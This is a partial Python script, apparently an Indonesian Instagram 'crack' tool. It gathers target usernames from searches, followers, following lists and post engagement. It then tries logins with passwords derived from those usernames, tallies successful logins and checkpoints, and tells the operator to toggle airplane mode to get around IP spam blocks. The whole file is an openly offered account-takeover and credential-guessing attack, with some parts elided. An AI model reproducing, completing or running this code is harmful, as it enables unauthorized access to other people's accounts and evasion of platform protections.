...
color_table = "#FFFFFF"
color_rich = "[#00C8FF]"
sys.stdout.write('\x1b]2; SCRIPT IG LUXINE\x07')
...
/ $$   |$$    $$/         $$    $$/ $$ | $$$ |$$       |
$$$$$$/  $$$$$$/           $$$$$$/  $$/   $$/ $$$$$$$$/ 
                                                        """,title=f'{warna_biru}• {warna_merah}• {warna_putih}made by {warna_merah}indonesia coder {warna_merah}• {warna_biru}•'))
...
def ggwp17():
        try:
            ...
            coki = input(f"{P}[{M}C{P}] masukan cookie anda : ")
            loading()
            try:
...
class instagram:
	...
	def logo(self):
		for i in external:
			...
			insta = prints
			crack = Panel
			insta(crack(f"""{warna_ungu}{alamat_region}""",title=f'{warna_biru}• {warna_merah}• {warna_ungu}{alamat_ip}{warna_merah} •{warna_biru} •'))
			insta(crack(f"""{warna_putih}[{warna_hijau}01{warna_putih}] crack dari pencarian username {warna_hijau}    ON
{warna_putih}[{warna_hijau}02{warna_putih}] crack dari pengikut{warna_hijau}               ON
{warna_putih}[{warna_hijau}03{warna_putih}] crack dari mengikuti {warna_hijau}             ON {warna_putih}
[{warna_hijau}04{warna_putih}] crack dari jumblah view postingan {warna_hijau}ON
{warna_putih}[{warna_hijau}05{warna_putih}] crack dari jumblah like postingan {warna_hijau}ON
{warna_putih}[{warna_hijau}06{warna_putih}] masuk ke menu facebook {warna_hijau}           ON
{warna_putih}[{warna_hijau}07{warna_putih}] crack ulang hasil {warna_kuning}cp{warna_merah}              OF
{warna_putih}[{warna_hijau}08{warna_putih}] cek hasil crack{warna_hijau}                   ON
{warna_putih}[{warna_hijau}00{warna_putih}] keluar"""))
	...
	def ingfo(self):
		prints(Panel(f"""{warna_putih}SETIAP 200/300 USERNAME AKTIFKAN MODE PESAWAT DAN MATIKAN KEMBALI SCRIPT AKAN MEMBELI ARAHAN JIKA ADA NADA IP SPAM SILAKAN MODE PESAWAT""",title=f'{warna_biru}• {warna_merah}•{warna_ungu} PERINGATAN{warna_merah} •{warna_biru} •'))

	def methodku(self):
		insta = prints
		crack = Panel
		insta(crack(f"""{warna_putih}[{warna_hijau}01{warna_putih}] AJAX
{warna_putih}[{warna_hijau}02{warna_putih}] API""",title=f'{warna_biru}•{warna_merah} •{warna_ungu} METODE MENU{warna_merah} •{warna_biru} •'))
	def passwordAPI(self,xnx):
		prints(Panel(f"{warna_putih}total username  : {len(internal)}"))
		self.methodku()
		u = input(f'{P}[{H}+{P}] pilih metode : ')
		if u in [""]:
		    method.append('satu')
		elif u in ["1","01"]:
		    method.append('satu')
			...
			method.append('satu')
		prints(Panel(f"""{warna_putih}[{warna_hijau}01{warna_putih}] sandi,sandi123,sandi1245
{warna_putih}[{warna_hijau}02{warna_putih}] sandi,sandi123,sandi1234,sandi12345
{warna_putih}[{warna_hijau}03{warna_putih}] sandi,sandi123,sandi1234,sandi12345,sandi123456
{warna_putih}[{warna_hijau}04{warna_putih}] fullsandi + manual""",title=f'{warna_biru}• {warna_merah}• {warna_ungu}PASSWORD {warna_merah}• {warna_biru}'))
		c=input(f'{P}[{H}+{P}] sandi : ')
		if c in ["1","01"]:
	...
	def crackAPI(self,user,pas):
		...
		sys.stdout.write(f'\r{P}[{H}✓{P}] {H}http://run.com{P} {loop}/{len(internal)}{P} OK:{H}{len(success)} {N}CP:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		for pw in pas:
				try:
					...
					if "logged_in_user" in str(xyaaXD) or "sessionid" in ses.cookies.get_dict():
						...
						try:
							...
							print('\n')
							cetak(nel(pepekXD,style='',title='\r[green]Login Metode Ajax[white]'))
						...
						print('\n')
						cetak(nel(pepekXD,style='', title='\r[yellow]Checkpoint Metode Ajax[white]'))
	...
	#					os.popen('play-audio ip.mp3')
						sys.stdout.write(f'\r{P}[{M}✓{P}] {M}http//ip.com {P}{loop}/{len(internal)}{P} OK:{H}{len(success)} {N}CP:{K}{len(checkpoint)} {P}');sys.stdout.flush()
						time.sleep(1)
	...
	def crackAPIversi2(self,user,pas):
		...
		sys.stdout.write(f'\r{P}[{H}√{P}] {H}run.com {P}{loop}/{len(internal)}{P} OK:{H}{len(success)} {N}CP:{K}{len(checkpoint)} {P}');sys.stdout.flush()
		try:
			for pw in pas:
